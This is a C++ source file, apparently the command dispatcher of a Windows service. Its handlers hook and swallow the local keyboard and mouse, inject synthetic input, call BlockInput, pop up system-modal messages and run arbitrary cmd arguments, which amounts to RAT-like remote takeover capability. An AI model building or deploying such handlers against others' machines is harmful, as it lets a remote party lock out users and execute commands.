#include "..\Service\pch.hpp"

#include "CommandProperties.hpp"

const std::array<CommandProperties, static_cast<size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES
{ {
	{ std::make_tuple(Commands::MESSAGEBOX,       "message"), _onCmd_MESSAGEBOX       },
	{ std::make_tuple(Commands::KEYBOARDCTRL_ON,  "kbon"),    _onCmd_KEYBOARDCTRL_ON  },
	{ std::make_tuple(Commands::KEYBOARDCTRL_OFF, "kboff"),   _onCmd_KEYBOARDCTRL_OFF },
	{ std::make_tuple(Commands::MOUSECTRL_ON,     "mon"),     _onCmd_MOUSECTRL_ON     },
	{ std::make_tuple(Commands::MOUSECTRL_OFF,    "moff"),    _onCmd_MOUSECTRL_OFF    },
	{ std::make_tuple(Commands::EXECUTECMD,       "cmd"),     _onCmd_EXECUTECMD       },
	{ std::make_tuple(Commands::BLOCKINPUT_ON,    "bion"),    _onCmd_BLOCKINPUT_ON    },
	{ std::make_tuple(Commands::BLOCKINPUT_OFF,   "bioff"),   _onCmd_BLOCKINPUT_OFF   }
} };

namespace detail
{
	namespace hooks
	{
		namespace data
		{
			static HHOOK mouseHook;
			static HHOOK keyboardHook;
		}

		LRESULT CALLBACK LowLevelMouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
		{
			if (nCode == HC_ACTION)
				return (-1);

			return CallNextHookEx(data::mouseHook, nCode, wParam, lParam);
		}

		LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
		{
			if (nCode == HC_ACTION)
				return (-1);

			return CallNextHookEx(data::keyboardHook, nCode, wParam, lParam);
		}
	} // namespace hooks

	namespace emulator
	{
		constexpr size_t DELAY = 100;

		bool SendMouseInput(DWORD button)
		{
			INPUT input = { INPUT_MOUSE };
			input.mi.dwFlags = button;

			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			SleepEx(DELAY, FALSE);

			input.mi.dwFlags = (button <<= 1);
			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;
			
			return true;
		}

		bool SendKeyboardInput(UINT key)
		{
			INPUT input = { INPUT_KEYBOARD };
			input.ki.wScan = MapVirtualKey(key, MAPVK_VK_TO_VSC);
			input.ki.wVk   = key;

			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			SleepEx(DELAY, FALSE);

			input.ki.dwFlags = KEYEVENTF_KEYUP;
			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			return true;
		}
	} // namespace emulator
} // namespace detail

#pragma region Functions

bool _onCmd_MESSAGEBOX(const std::vector<std::string> &args)
{
	if(args.size() != 1ull)
		return false;

	return (MessageBoxA(nullptr, args[0].c_str(), "MESSAGE", MB_ICONERROR | MB_OK | MB_SYSTEMMODAL) != 0);
}

bool _onCmd_KEYBOARDCTRL_ON(const std::vector<std::string> &args)
{
	if (!detail::hooks::data::keyboardHook)
		detail::hooks::data::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, detail::hooks::LowLevelKeyboardProc, nullptr, 0ul);

	if (UINT key{}; sscanf_s(args[0].c_str(), "%u", &key))
		return detail::emulator::SendKeyboardInput(key);

	return true;
}

bool _onCmd_KEYBOARDCTRL_OFF(const std::vector<std::string>&)
{
	return UnhookWindowsHookEx(detail::hooks::data::keyboardHook);;
}

bool _onCmd_MOUSECTRL_ON(const std::vector<std::string> &args)
{
	if(!detail::hooks::data::mouseHook)
		detail::hooks::data::mouseHook = SetWindowsHookEx(WH_MOUSE_LL, detail::hooks::LowLevelMouseProc, nullptr, 0ul);

	int   x{},
		  y{};
	DWORD button{};
	if (sscanf_s(args[0].c_str(), "%d %d %u", &x, &y, &button) == 3 && !detail::emulator::SendMouseInput(button))
		return false;

	return SetCursorPos(x, y);
}

bool _onCmd_MOUSECTRL_OFF(const std::vector<std::string>&)
{
	return UnhookWindowsHookEx(detail::hooks::data::mouseHook);
}

bool _onCmd_EXECUTECMD(const std::vector<std::string> &args)
{
	std::string params;
	for (auto &&arg : args)
		params += arg;

	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.fMask        = SEE_MASK_ASYNCOK | SEE_MASK_NO_CONSOLE;
	sei.lpVerb       = TEXT("open");
	sei.lpFile       = TEXT("cmd");  
	sei.lpParameters = params.c_str();
	sei.nShow        = SW_SHOW;

	return ShellExecuteEx(&sei);
}

bool _onCmd_BLOCKINPUT_ON(const std::vector<std::string>&)
{
	return BlockInput(true);
}

bool _onCmd_BLOCKINPUT_OFF(const std::vector<std::string>&)
{
	return BlockInput(false);
}

#pragma endregion